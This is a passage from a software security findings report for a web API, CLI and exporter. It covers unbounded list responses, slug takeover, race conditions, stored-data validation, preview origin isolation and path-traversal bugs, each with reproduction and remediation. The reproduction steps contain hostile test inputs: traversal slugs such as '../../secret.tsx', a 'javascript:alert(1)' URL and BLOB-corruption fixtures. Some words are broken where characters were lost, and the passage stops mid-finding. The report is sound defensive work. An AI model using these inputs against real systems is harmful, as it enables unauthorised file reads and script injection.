### Medium — Public collection and creator-link responses had unbounded size

**Evidence:** A public collection with 501 resource rows returned HTTP 200 and

serialized every row. A creator profile's public links route also returned

every stored link without a result bound. Both records could grow through

authenticated write routes over time.

**Reproduction:** Seed a public collection with 501 item rows and request

`GET /api/collections/:id`. Before the fix it returned the full list with 200;

the regression now expects a controlled 503. Seed a profile with 21 creator

links and request `GET /api/creator-links/:userId` for the same controlled

overflow behavior.

**Root cause:** Public read handlers used unbounded `.all()` queries, and the

corresponding write routes had no per-owner/item ceilings.

**Affected code:** `apps/api/src/routes/collections.ts`,

`apps/api/src/routes/creator-links.ts`, and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Collection accounts are capped at 100 collections, individual

collections at 500 resources, and creator profiles at 20 external links. Writes

at each ceiling return 409. Public reads fetch at most one row beyond the

ceiling, then fail with an explicit 503 rather than silently truncating

existing user data. D1 regressions verify both write and read behavior.

### Medium — Local MCP SSE sessions had no concurrency ceiling

**Evidence:** The unauthenticated SSE compatibility server bound only to

loopback and checked browser origins, but accepted an unlimited number of open

MCP client sessions.

**Reproduction:** Connect eight simultaneous MCP clients and attempt a ninth.

Before the fix the ninth session connected successfully; the regression now

expects it to be rejected.

**Root cause:** The server stored every live `SSEServerTransport` in a map but

never bounded its size.

**Affected code:** `packages/mcp/src/server-sse.ts` and

`packages/mcp/src/__tests__/client-workflow.test.ts`.

**Remediation:** The local server now supports at most eight concurrent SSE

sessions and returns HTTP 503 with `Retry-After: 5` plus a clear error when full.

The existing origin check, loopback bind restriction and MCP SDK 4 MiB message

body limit remain active. Actual MCP clients verify the ninth connection and a

5 MiB message are rejected at the transport boundary.

### SEC-37-028 — Medium — Authenticated favorite lists could grow without a bound

**Evidence:** Seeding one authenticated account with 501 favorite slugs made

`GET /api/favorites` return all 501 rows with HTTP 200. The API also accepted

additional distinct favorite slugs indefinitely.

**Reproduction:** Seed 501 favorite records for one user, request the list, and

attempt to add another slug. Before the fix the read returned 200 and the write

returned 201; the D1 regression expects an explicit 503 and 409 respectively.

**Root cause:** The authenticated route used an unbounded D1 `.all()` read and

the write route had no per-user storage ceiling.

**Affected code:** `apps/api/src/routes/favorites.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Favorite lists are capped at 500 unique slugs per account.

Reads fetch at most one row beyond the limit and fail explicitly for legacy

overflow; new writes at capacity return 409 while duplicate saves remain

idempotent.

### SEC-37-029 — High — A published slug could overwrite another account's project

**Evidence:** The D1 regression creates separate Alice and Bob projects, publishes

Alice's project under a chosen slug, then attempts to publish Bob's project under

the same slug. The prior UPSERT changed the public snapshot rather than rejecting

the collision. After the fix, Bob receives HTTP 409 and the public read still

returns Alice's project.

**Reproduction:** Publish one project with `customSlug: "shared-review-test"`,

then have another owner publish a different project using that slug and read the

public URL.

**Root cause:** The unique-slug UPSERT updated the existing row without checking

that it belonged to the same project. The project record was marked published

before the snapshot write succeeded.

**Affected code:** `apps/api/src/routes/projects.ts`,

`apps/api/src/routes/published.ts`, and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Slugs must be lowercase URL-safe values. The D1 UPSERT only

updates a snapshot when its stored project ID matches the caller's project ID;

conflicts return 409 before project publication state changes. The in-memory

path applies the same ownership check.

### SEC-37-030 — Medium — Cloud project and revision lists had no bounded ceiling

**Evidence:** The D1 regression seeds 101 projects and 501 revision snapshots.

Previously the project list returned HTTP 200 with every project and the

revision route returned HTTP 200 with all 501 snapshots. Writes could keep

growing both lists.

**Reproduction:** Add 101 projects to one account, request `GET /api/projects`,

and attempt to create another; add 501 revisions to one project, request its

revision list, and attempt a further checkpoint.

**Root cause:** Both list routes used unbounded `.all()` queries, while project

creation and checkpoint/save paths had no corresponding account/history cap.

**Affected code:** `apps/api/src/routes/projects.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Cloud accounts may store at most 100 projects and each project

at most 500 revisions. D1 creation uses a conditional insert and atomic initial

checkpoint; reads fetch only one record beyond the ceiling and fail explicitly

for legacy overflow. Checkpoint and project-save writes reject at the cap.

### SEC-37-031 — Medium — Invalid checkpoint and publish payloads could crash or bypass slug validation

**Evidence:** `POST /api/projects/:id/revisions` with JSON
ull` previously

returned HTTP 500 after dereferencing `summary`. Publish accepted arbitrary

custom slug strings instead of validating the public URL contract. Regressions

now require 400 for
ull` and path-like slug values, while bodyless publish

continues to work.

**Reproduction:** Send JSON
ull` as a checkpoint body, then try publishing

with `{"customSlug":"../private-project"}`.

**Root cause:** The handlers assumed JSON was always a record and treated the

publish request body as an unvalidated object.

**Affected code:** `apps/api/src/routes/projects.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Optional JSON bodies are parsed as `unknown`; checkpoint and

publish schemas reject null, malformed, oversized, and unknown fields with a

controlled 400. An absent body remains valid for default publish behavior.

### SEC-37-032 — Medium — Concurrent writes could bypass account storage ceilings

**Evidence:** A D1 regression sends eight simultaneous requests at each

collection, collection-item, favorite, and creator-link limit. Before the fix,

all eight writes succeeded because each request could observe a count below the

limit before inserting. After the fix, exactly one request succeeds and the

other seven receive HTTP 409 at every tested ceiling.

**Reproduction:** Seed each account/resource to one below its configured cap,

then issue eight concurrent distinct writes. Repeat for collection creation,

collection items, favorites, and creator links.

**Root cause:** The handlers performed a count check followed by a separate

insert. Concurrent requests could all pass the check before any insert became

visible.

**Affected code:** `apps/api/src/routes/collections.ts`,

`apps/api/src/routes/favorites.ts`, `apps/api/src/routes/creator-links.ts`,

and `apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** D1 inserts now include the quota predicate in the same

`INSERT ... SELECT ... WHERE count < limit` statement. The database makes the

capacity check and write one operation, while duplicate collection items stay

idempotent.

### SEC-37-033 — Medium — Cloud project history could exceed a safe response size

**Evidence:** Nine schema-valid project manifests, each with a 1 MB property,

made `GET /api/projects` return an aggregate response above the intended safe

limit. Nine similarly sized revision snapshots did the same for the revision

route. The regression expected both routes to return HTTP 503 before the fix;

both returned 200. Quote-heavy payloads whose total stored size remained below

8 MiB also exceeded the serialized response ceiling before the fix.

**Reproduction:** Seed nine 1 MB manifests for one account and request its

project list; seed nine 1 MB revision snapshots for a project and request its

revision history.

**Root cause:** Per-record input validation allowed a manifest up to 1.5

million characters, while the record-count ceilings still allowed many large

manifests to be serialized in one response.

**Affected code:** `apps/api/src/routes/projects.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** D1 routes check the aggregate stored manifest bytes before

loading list rows, then account for UTF-8 serialized bytes one item at a time.

Both steps stop work at the 8 MiB response ceiling and return a controlled 503

rather than truncating stored history.

### SEC-37-034 — Medium — Authenticated public remixes bypassed the cloud project cap

**Evidence:** With 100 cloud projects already stored for Alice, the authenticated

`POST /api/published/:slug/remix` path returned 201 and created project 101.

The regression now expects a 409 and verifies no project or revision is added.

After removing one project, the same user can remix successfully and read the

saved project and initial revision.

**Reproduction:** Publish a project owned by Bob, seed 100 projects for Alice,

then have Alice call the published-project remix endpoint.

**Root cause:** The remix handler inserted a project and revision directly,

bypassing the conditional project-count insert used by normal cloud creation;

the two inserts also were not atomic.

**Affected code:** `apps/api/src/routes/published.ts`,

`apps/api/src/routes/projects.ts`, `apps/api/src/cloud-limits.ts`, and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Remix creation now uses the shared project-count limit and an

atomic D1 batch for the project plus its first revision. The route returns 409

at capacity. Remix names are bounded to the project-name contract, including

the added suffix.

### SEC-37-035 — Medium — Concurrent manual checkpoints returned internal errors

**Evidence:** Two new D1 regressions failed before the fix. A rejected revision

insert produced HTTP 500, and two simultaneous checkpoint requests produced

HTTP 201 plus HTTP 500. After the fix, a failed snapshot write returns a

controlled 503 without advancing the project; concurrent requests return HTTP

201 plus HTTP 409 and retain exactly revisions 1 and 2.

**Reproduction:** Create a D1 project, reject a manual revision insert with a

trigger and submit a checkpoint. Separately, submit two manual checkpoints at

the same time and inspect the response codes and saved revision sequence.

**Root cause:** Manual checkpoints inserted the snapshot and updated the

project in separate, unguarded statements. Insert errors escaped the route,

and concurrent requests raced for the same revision ID.

**Affected code:** `apps/api/src/routes/projects.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** A compare-and-swap update and conditional revision insert now

run in one atomic D1 batch. The batch enforces the revision-count ceiling,

rolls back both statements on storage failure, and reports a stale concurrent

request as a controlled conflict.

### SEC-37-036 — Medium — Corrupt laptop queue records reached the worker boundary

**Evidence:** A regression with a malformed oldest queue record failed before

the fix: `/poll` returned HTTP 503 and abandoned the claim instead of advancing

to the next valid ticket. The same stored-data boundary accepted schema-invalid

screen/design data and returned a generic error for a malformed completed

result. After the fix, the poller fails invalid records explicitly and returns

the next valid task; status reads return a specific controlled 503 for an

invalid saved result.

**Reproduction:** Queue two jobs, corrupt the first job's stored screen JSON and

the second job's Design DNA, then poll as the host. Complete a valid job, corrupt

its stored result JSON, and read its status with the client's access token.

**Root cause:** Queue reads parsed stored JSON without validating it against the

same `ProjectNode`, `DesignDNA`, and intent-command schemas used at ingress.

Malformed JSON could escape after claiming a ticket, while valid but malformed

objects could cross the laptop trust boundary.

**Affected code:** `apps/api/src/routes/inference.ts` and

`apps/api/src/__tests__/inference-queue.test.ts`.

**Remediation:** Host polling schema-validates stored screen and DNA payloads,

marks corrupt tickets failed, and continues through a bounded number of queue

entries. Completed result reads validate the stored command and return a

controlled `QueueDataUnavailable` response without exposing corrupt content.

### SEC-37-037 — Medium — Saved resource slugs bypassed validation on read

**Evidence:** A D1 regression returned HTTP 200 with `../private-resource` in

both a public collection and the owner's favorite list. Removing either

read-path guard independently made the test fail with HTTP 200 instead of the

expected controlled 503. Both endpoints now reject invalid stored slugs.

**Reproduction:** Insert a path-like resource slug directly into

`collection_items` and `favorites`, then read the public collection and the

authenticated favorite list.

**Root cause:** Write handlers used `resourceSlugSchema`, but the corresponding

read handlers trusted persisted values and returned them to clients.

**Affected code:** `apps/api/src/routes/collections.ts`,

`apps/api/src/routes/favorites.ts`, `apps/api/src/resource-slug.ts`, and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Both D1 read paths validate every stored slug with the shared

canonical-slug helper and return a controlled endpoint-specific 503 when any

record is malformed or non-canonical.

### SEC-37-038 — Medium — Public creator-link reads returned unsafe stored URLs

**Evidence:** A regression seeded a legacy D1 creator link with

`javascript:alert(1)`. Before the read guard, the public link-list endpoint

returned it with HTTP 200; after the fix it returns a controlled 503.

**Reproduction:** Insert a creator-link record with an executable scheme or

embedded credentials, then request `/api/creator-links/:userId`.

**Root cause:** URL checks existed on writes, but public reads trusted legacy or

corrupted stored titles and URLs.

**Affected code:** `apps/api/src/routes/creator-links.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Public link reads reapply title bounds and the HTTP(S), host,

and no-credentials URL contract before returning records.

### SEC-37-039 — Medium — Stored profile URLs were not validated on account or publication reads

**Evidence:** A D1 fixture stored `javascript:alert(1)` as a profile avatar URL.

With the old parser behavior, `/api/me` returned HTTP 200 and exposed that URL;

the new regression requires controlled 503 responses from both `/api/me` and

the public published-project route.

**Reproduction:** Publish a project, store an unsafe avatar URL in its owner's

profile, then read the account profile and public project.

**Root cause:** The account parser validated specialty tags and availability

but trusted the remaining stored fields. The published-project route bypassed

that parser and returned selected profile fields directly.

**Affected code:** `apps/api/src/profile-contract.ts`,

`apps/api/src/routes/me.ts`, `apps/api/src/routes/published.ts`, and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** One shared stored-profile contract now validates username,

bio, HTTPS avatar URL, GitHub handle, tags, availability, and timestamps. Both

account and publication reads fail closed on invalid profile data.

### SEC-37-040 — Medium — Corrupt creator-link field types caused an uncaught read error

**Evidence:** A D1 record with its `title` stored as a BLOB caused the public

creator-link route to throw `TypeError: link.title.trim is not a function` and

return HTTP 500. The regression was run before the fix and failed with the

expected-vs-actual status mismatch (500 instead of 503).

**Reproduction:** Insert a creator-link row whose title is `CAST('Corrupt title'

AS BLOB)`, then request `/api/creator-links/:userId`.

**Root cause:** The stored-row validator assumed D1 returned declared text

columns as strings and called `.trim()` before checking their runtime types.

**Affected code:** `apps/api/src/routes/creator-links.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Validate the stored record as unknown data first, including

all fields returned to callers, then validate title and URL constraints. A

malformed row now returns the existing controlled 503 response.

### SEC-37-041 — Medium — Public publication reads trusted corrupted metadata

**Evidence:** A published row whose
ame` was stored as a D1 BLOB still

returned HTTP 200 from `/api/published/:slug`; the expected response is a

controlled 503 because the public metadata no longer matches its stored-data

contract. The regression failed before the route-level record validation was

added.

**Reproduction:** Create and publish a valid project, replace the published

row's
ame` with `CAST('Corrupt name' AS BLOB)`, then request its public page

and remix endpoint.

**Root cause:** The route validated the JSON manifest and creator profile but

returned publication metadata directly from the D1 row without validating its

runtime types or bounds.

**Affected code:** `apps/api/src/routes/published.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Parse the complete publication row with a bounded schema before

either returning it or using it to construct a remix. Invalid stored records

now fail closed with the existing controlled 503 response.

### SEC-37-042 — Medium — Collection reads returned corrupted D1 metadata

**Evidence:** D1 collection rows with BLOB-backed names or descriptions were

returned as successful list/detail responses. The new Miniflare regression

failed before the fix with HTTP 200 where both routes should fail closed with

HTTP 503.

**Reproduction:** Create two public collections, replace one
ame` and the

other `description` with BLOB values, then request `/api/collections` and both

`/api/collections/:id` detail routes.

**Root cause:** Collection reads validated visibility and resource slugs but

trusted the remaining typed D1 fields when spreading rows into JSON responses.

**Affected code:** `apps/api/src/routes/collections.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Validate every returned collection field against a bounded

stored-record schema before listing or returning the collection. Malformed

metadata now produces a controlled `CollectionDataUnavailable` 503 response.

### SEC-37-043 — Medium — Project actions trusted malformed D1 metadata

**Evidence:** A project with a BLOB `currentRevision` and invalid numeric

publication flag returned HTTP 200 from list/detail, treated an update as a

normal 409 revision conflict, and allowed publication with HTTP 200. The new

Miniflare regression reproduced all four responses before the fix.

**Reproduction:** Create a valid cloud project, store `currentRevision` as a

BLOB and `isPublished = 2`, then request the account list, project detail,

update, and publish routes.

**Root cause:** Project reads validated the manifest but trusted the remaining

typed D1 columns, and update/publication logic used those values directly.

**Affected code:** `apps/api/src/routes/projects.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Validate the full bounded scalar project record before list,

detail, update, checkpoint, or publication operations. Corrupted records now

fail closed; owner deletion remains available so the record can be recovered.

### SEC-37-044 — Medium — Revision history returned malformed D1 metadata

**Evidence:** A revision with BLOB-backed `summary` and `revisionNumber`

returned HTTP 200 from the revision-history endpoint. The new D1 regression

failed before the fix, where the expected result is a controlled 503.

**Reproduction:** Create a valid project, replace the initial revision's

`summary` and `revisionNumber` with BLOB values, then request

`/api/projects/:id/revisions`.

**Root cause:** Revision reads validated the embedded manifest but spread the

other D1 fields into the response without checking their runtime types.

**Affected code:** `apps/api/src/routes/projects.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Validate each bounded revision record before normalizing its

manifest and serializing it. Malformed history now fails closed, while owner

deletion remains available for recovery.

### SEC-37-045 — Medium — Laptop health returned malformed heartbeat metadata

**Evidence:** An active worker heartbeat with a BLOB `deviceName` was returned

as HTTP 200 from `/api/inference/health`. The Miniflare regression failed

before the fix; malformed active status now returns a controlled 503.

**Reproduction:** Send a valid laptop heartbeat, replace `host_workers.deviceName`

with a BLOB, then request the authenticated inference health endpoint.

**Root cause:** The health route trusted D1's declared text type and serialized

the device name without runtime validation.

**Affected code:** `apps/api/src/routes/inference.ts` and

`apps/api/src/__tests__/inference-queue.test.ts`.

**Remediation:** Validate the active heartbeat's device name and numeric

timestamp before reporting worker status. Corrupt status now fails closed with

`QueueDataUnavailable`.

### SEC-37-046 — Medium — Inference ticket readers trusted malformed stored fields

**Evidence:** An authenticated status read returned HTTP 200 for a failed

ticket whose `errorMessage` was stored as a BLOB. A worker poll also returned

the oldest queued ticket with a BLOB prompt instead of skipping it. Regressions

reproduce both behaviors before the shared stored-ticket validation.

**Reproduction:** Submit a ticket and set its status to `failed` with a BLOB

`errorMessage`, then request `/api/inference/status/:ticketId` using its token.

For worker polling, queue a valid ticket, change its `prompt` to a BLOB, queue

another valid ticket, then poll with the host credential.

**Root cause:** Status and worker-poll paths trusted D1's declared column types;

only the JSON payload fields had individual validation.

**Affected code:** `apps/api/src/routes/inference.ts` and

`apps/api/src/__tests__/inference-queue.test.ts`.

**Remediation:** Validate the bounded ticket record before status serialization

or host handoff. Malformed status fails closed, and malformed queued tickets

are failed safely so the worker can continue to the next valid request.

## Verification

- `pnpm typecheck` passed across all 22 workspace packages; `pnpm lint` passed

  with 33 existing warnings and no errors; the isolated current-tree `pnpm test`

  run passed all 1,109 tests in 73 files. An initial run concurrent with

  typechecking reported a Vitest worker RPC timeout after all tests passed; the

  isolated rerun completed without errors.

- `pnpm audit:all` passed the 16/16 behavioral release gate, production build

  (717 Astro pages plus the Sites artifact), bundle budgets, 324-resource

  licence/provenance audit, and secret/isolation scan with zero violations.

- The full local E2E suite was rerun after the final API-only persisted-data

  read fixes: 254 Astro-preview tests passed with 88 configured skips, 69 Sites

  Worker tests passed with 29 configured skips, and all 3 isolated-preview tests

  passed. The Sites run certified all 324 catalogue resources at their required

  widths and Gold variants; responsive, Axe, sandbox-isolation and flagship

  browser checks passed. No deployed release candidate was used.

- After tightening preview CSP, both focused policy/isolation tests passed;

  the 324-resource certified-width test and Gold resource width/variant

  certification also passed under the new policy. The full E2E suite above ran

  before this Worker-only change; the modified preview boundary received these

  complete resource and targeted isolation checks after the change.

- After the CSP fix and audit probe, `pnpm test` passed 1,109 tests in 73 files,

  `pnpm typecheck` passed all 22 packages, `pnpm lint` passed with 0 errors and

  33 existing warnings, and `pnpm audit:all` passed 16/16 gates, built 717 Astro

  pages and the Sites artifact, passed bundle budgets and reported zero

  provenance or secret/security violations.

- The read-only deployed probe against the existing review Site recorded 200

  for `/` and `/r/button`, no failed requests or browser errors, opaque preview

  origin, and blocked parent DOM/storage access. It failed only the new strict

  script/style source-scope check because that deployed version predates the

  local fix; its before screenshots and machine-readable result are retained.

- Exporter regressions: ZIP traversal/alias rejection and generated archive

  extraction passed. An independent Python 3.13 `zipfile` consumer also

  extracted a fresh archive, passed CRC validation, and matched all three file

  contents; see `evidence/step-37/zip-consumer.json`.

- API proxy suite: all five tests passed, including bounded streamed request

  and provider response cases.

- API request-boundary tests return 413 and cancel both a lying-length streamed

  report body and a body rejected from its declared size; creator-link API

  tests reject executable and deceptive URLs.

- Public report API regressions reject object/array values previously coerced

  into persisted strings while the valid report path remains successful.

- Collection API regression rejects the truthy string `"false"`; valid

  boolean-based collection creation and access-control tests remain passing.

- Profile API regression rejects the truthy string `"false"`; valid boolean

  profile updates and session-safe profile responses remain covered.

- Cloud project tests reject malformed manifests, verify metadata-only saves

  retain screen content and canonical identity, and verify D1 create/update/

  publish/remix flows using valid shared manifest fixtures.

- D1 profile regressions reject non-string specialty tags and fail closed on

  malformed stored tag JSON; published-project regressions reject malformed

  or mismatched stored manifests. Guest and cloud remix regressions validate

  canonical independent project IDs and persist the remixed identity.

- Cloud-project D1 regressions reject corrupted current manifests on read/list,

  prevent corrupted checkpoints and publication, preserve a valid historical

  recovery snapshot, and fail closed on malformed revision data.

- Favorites and collection-item API regressions reject empty, oversized, and

  path-like resource slugs; all 79 API tests pass.

- API rate-limit regressions cover every account mutation route, public writes,

  auth endpoints, BYO-AI credential fingerprinting, inference polling before

  D1 maintenance, missing production bindings, and binding failures. Wrangler

  type generation confirmed all five bindings in both Worker configs.

- CLI package and black-box suites pass 36 tests, including traversal, symlink,

  unsafe filename, and command exit-status cases. The real MCP stdio workflow

  and catalogue-safety suites pass 10 tests, including oversized argument and

  external symlink checks.

- The combined CLI transport, source, black-box and installed-package suites

  pass 42 tests. They cover HTTPS-only public access, private/local destination

  rejection, trusted local opt-in, public HTTP denial under that opt-in, no

  redirect following, streaming size limits, malformed records and the

  installed CLI outside the monorepo dependency tree.

- The actual CLI black-box regression for a private registry with the opt-in

  unset failed before the error-propagation fix and now passes; it confirms the

  policy block is named and no output directory is created. The CLI's 42-test

  security suite remains the previously recorded broader run.

- The Windows NTFS regression demonstrated that directory-only ACL tightening

  leaves explicit legacy child grants intact. The production startup helper now

  resets existing secret-file ACLs, rejects reparse points, and grants only the

  current owner and SYSTEM; the fixture passes without touching real secrets.

  A Windows CI job now runs this platform-specific check on every build.

- The current `pnpm audit:all` run passed the 16/16 behavioral gate, built 717

  Astro pages and the Sites artifact, passed bundle budgets, audited all 324

  catalogue resources, and found zero provenance or secret/security issues.

  The preview build still emits a 903.22 KB raw / 191.54 KB gzip chunk warning;

  performance assessment remains in Step 38.

- D1 public-read regressions now return controlled overflow for a 501-item

  public collection and a 21-link creator profile; adding another item/link at

  either maximum returns 409. The targeted Miniflare/D1 tests pass.

- Favorite D1 regression now returns a controlled 503 for 501 existing rows and

  409 for a new write at capacity while preserving duplicate-save behavior.

- The MCP SSE client suite passes six tests, including a real 9-client attempt

  against the 8-session ceiling and an oversized 5 MiB message rejected by the

  SDK transport's 4 MiB body limit. Production CLI/MCP code contains no shell or

  child-process execution; `child_process.spawnSync` appears only in CLI tests.

- Report API regressions reject production submissions when abuse verification

  is absent while explicit local/test modes preserve the unconfigured path.

- Deeply nested `screenAst` input now returns a controlled 400 instead of

  overflowing recursive Zod validation; the regression confirms no task is

  queued.

- The D1 regression reproduces a corrupt collection visibility flag returning

  private data to a guest before the fix; both detail and owner-list reads now

  fail closed.

- D1 regressions verify that a foreign project cannot take over a published

  slug, project/revision counts have bounded ceilings, and malformed checkpoint

  or publish payloads return controlled errors. The cloud-sync D1 suite also

  verifies concurrent writes cannot exceed collection, item, favorite, or

  creator-link ceilings. Nine near-maximum manifests are rejected by the

  aggregate stored-byte preflight; escaped JSON values whose stored total is

  below 8 MiB are rejected by the incremental serialized-response check.

- An authenticated public remix at the 100-project ceiling returns 409 without

  a project or revision. After one slot is freed, the remix and its initial

  checkpoint persist and load correctly, including a maximum-length source name.

- Manual D1 checkpoints now roll back their current-revision update when the

  snapshot cannot be stored; concurrent checkpoint attempts produce one 201

  and one 409 with an intact revision sequence.

- Laptop queue reads reject malformed stored screen, DNA and result data;

  corrupted pending jobs fail safely without preventing a later valid job from

  reaching the host.

- Favorite, collection, creator-link and profile reads validate persisted

  values before returning them through public or account APIs.

- Creator-link D1 reads now also reject non-text stored fields before string

  operations; the before-fix BLOB fixture returned 500 and the regression now

  requires the controlled `CreatorLinksDataUnavailable` 503 response.

- Published-project reads and remixes now validate bounded row metadata before

  serving or using it; the before-fix BLOB fixture returned HTTP 200 on the

  public route and now requires the controlled 503 response.

- Collection list/detail reads now validate complete persisted rows before

  serialization; the before-fix BLOB name/description fixture returned HTTP

  200 and now requires a controlled 503 response on all three read paths.

- CLI registry DNS regressions reject mixed public/private answer sets and

  verify trusted-local connections use the address already validated by DNS;

  all seven registry transport tests pass.

- MCP SSE churn regression opens, lists tools, and closes 24 clients in

  sequence without leaking slots beyond the eight-session cap.

- The two local Wrangler configs contain ten distinct rate-limit namespace IDs.

  Their uniqueness in the target Cloudflare account remains unverified.

- The host daemon Python suite passes all 10 transport/model adapter tests.

- The current checkout was rebuilt into the existing Docker API and CPU-host

  containers. Eight live checks passed: the 20-request public limit, inference

  completion, host-secret rejection, queue persistence through API restart,

  offline rejection, queue recovery after host resume, and backend

  unreachability while the API was stopped, plus fresh inference after a host

  container restart. The persistent D1 volume was

  preserved and both services were healthy after verification.

- MCP transport suite: local two-client workflow, cross-origin rejection, and

  non-loopback bind rejection passed.

- Sites Worker preview security test confirmed resource code runs with an

  opaque
ull` origin and cannot read the parent document or localStorage;

  the preview CSP blocks API connections while allowing compiled assets.

- Existing source patch code rejects absolute/traversal paths; its regression

  coverage remains in `packages/ingest/src/__tests__/ingest.test.ts`.

- Sites security, inference, and secrets checks are listed in

  `evidence/step-37/verification.json`.

An independent Python 3.13 `zipfile` consumer extracted a fresh archive created

by the production `createZipArchive` helper. CRC validation and all three file

contents matched; the report is `evidence/step-37/zip-consumer.json`, with a

reproducible fixture generator and verifier beside it.

### SEC-37-057 — Medium — malformed cloud project updates were reported as a missing precondition

**Evidence:** A D1-backed `PUT /api/projects/:id` with malformed JSON returned

HTTP 428 `PreconditionRequired`. The before-fix regression is recorded in

`quality/evidence/step-37/d1-malformed-project-update.json`.

**Reproduction:** Send an authenticated `PUT /api/projects/malformed-json-project`

with `Content-Type: application/json` and body `{"expectedRevision":1,,}`.

Before the fix, the parser fallback converted invalid JSON to an empty object,

so the handler misreported it as a missing revision precondition.

**Root cause:** The update handler used `.catch(() => ({}))`, erasing the

difference between malformed JSON and a valid object that omitted

`expectedRevision`.

**Affected code:** `apps/api/src/routes/projects.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** The handler now maps parse failure to
ull` and returns the

existing HTTP 400 `Validation Error` for a non-object body. The regression was

run red first (428 instead of 400), then passed after the change. A black-box

D1-backed parser matrix now verifies malformed JSON returns HTTP 400 on all ten

account/public mutation routes covered by this boundary; the test is in

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

### SEC-37-058 — High — direct preview navigation exposed same-origin local storage

**Evidence:** Direct Chromium navigation to `/preview/?resource=button` returned

HTTP 200 at `http://127.0.0.1:4323`; the preview script could access

`localStorage`, where Tessellate keeps local project manifests. The before-fix

browser regression observed the application origin and successful storage

access. Desktop and mobile after screenshots and machine-readable results are

in `quality/evidence/step-37/preview-direct-after-1440.png`,

`quality/evidence/step-37/preview-direct-after-390.png`, and

`quality/evidence/step-37/preview-origin-isolation.json`.

**Reproduction:** Open the preview URL directly instead of through the product's

`sandbox="allow-scripts"` iframe, inspect `window.origin`, and attempt a

`localStorage` write. Before the fix the origin matched the Site and storage

was available; the iframe attribute did not apply to this navigation.

**Root cause:** The Sites Worker preview CSP restricted script/network sources

but omitted the CSP `sandbox` directive, so direct navigation did not inherit

the embedding element's origin isolation.

**Affected code:** `apps/sites/worker.ts`,

`tests/e2e/sites-preview-csp.spec.ts`, and `apps/sites/README.md`.

**Remediation:** Add `sandbox allow-scripts` to the preview response CSP. This

keeps resource scripts running in an opaque origin and blocks storage access

whether the preview is embedded or opened directly. The direct preview still

renders; its regression has zero console errors, uncaught errors, or failed

requests. All 10 preview CSP browser tests pass across desktop and mobile

Chromium. Separate hostile-content probes show CSP-cancelled fetch, image, and

script attempts plus a blocked nested frame, with no external response.

### SEC-37-059 — High — resource manifests could read and publish files outside their directory

**Evidence:** A registry-generation regression using a component file path of

`../../secret.tsx` failed before the fix because the generator returned without

rejecting the path. A second regression used an in-folder path through a

directory junction/symlink to a sibling folder; both the registry generator

and catalogue validator followed it. The red-before/green-after results are

recorded in `quality/evidence/step-37/resource-path-containment.json`.

**Reproduction:** Pass `generateRegistryItem` a resource manifest whose

component path traverses above its directory, or points through a symlink or

junction to an external file. The old generator included external file

contents in the generated registry item. Passing the linked resource through

`validateResource` also caused the import scanner to read the external file.

**Root cause:** `ResourceFileSpecSchema` accepted arbitrary nonempty strings,

and filesystem consumers joined those values to a resource directory without

checking canonical containment.

**Affected code:** `packages/schemas/src/resource.ts`,

`packages/catalog/src/validator.ts`, and `packages/registry/src/generator.ts`.

**Remediation:** The schema now rejects absolute paths, traversal segments,

empty segments, and Windows separator variants. The validator and registry

generator resolve paths against the canonical resource root and reject

out-of-root paths and symlink/junction targets before file reads. Red/green

regressions cover lexical traversal and external links in both consumers. The

fix is local and has not yet been verified in a deployed review build.

### SEC-37-060 — High — standalone export followed hostile resource slugs outside the catalogue

**Evidence:** Two pre-fix regressions passed a traversal slug and a valid slug

whose resource directory was a junction/symlink to a sibling folder. The disk

resolver returned the external `index.tsx` source in both cases. A project-level

export regression now confirms a hostile `ProjectManifest` fails with an

unresolved-resource error rather than copying the external source. Test results

are recorded in `quality/evidence/step-37/export-disk-resolver-containment.json`.

**Reproduction:** Import the Node disk resolver, then pass it a slug such as

`../../private-source`; alternatively, create a resource directory symlink

under a valid category and export a project that references that slug. Before

the fix, the resolver returned the external component source and the export

included it.

**Root cause:** The Node-only export adapter joined an untrusted manifest slug

to each resource category without validating the slug or checking that the

resource directory and its source files were regular files contained within

the selected catalogue root.

**Affected code:** `packages/exporter/src/node-disk-resolver.ts` and

`packages/exporter/src/__tests__/node-disk-resolver-security.test.ts`.

**Remediation:** The adapter now accepts only canonical kebab-case slugs,

skips symlink categories and resource directories, and resolves component and

manifest files only when they are regular files canonically contained inside

the resource directory. A project-level standalone export regression and

direct traversal/link regressions pass. The fix is local and has not yet been

verified in a deployed review build.

### SEC-37-061 — High — catalogue metadata controlled registry source and output paths

**Evidence:** A schema regression accepted a resource slug containing path

traversal, and the catalogue build API did not retain the discovered folder

associated with each validated manifest. The build script therefore rebuilt

the registry source path from `manifest.categories[0]` and `manifest.slug`, and

used the slug to form a registry output filename. Before the fix, both hostile

slug acceptance and missing directory provenance were reproduced. Results are

recorded in `quality/evidence/step-37/catalogue-registry-paths.json`.

**Reproduction:** Put a valid `manifest.json` in a discovered resource folder,

change its `slug` to a traversal string or its first `categories` entry to

`../outside`, then build the catalogue. Before the fix, the schema accepted the

path-like slug and the registry-generation call derived a source directory

outside `resources/`; the generated item filename also depended on the

untrusted slug.

**Root cause:** Resource slug fields had only a nonempty-string constraint,

and `scripts/build-catalog.ts` discarded the actual discovered folder before

generating registry files.

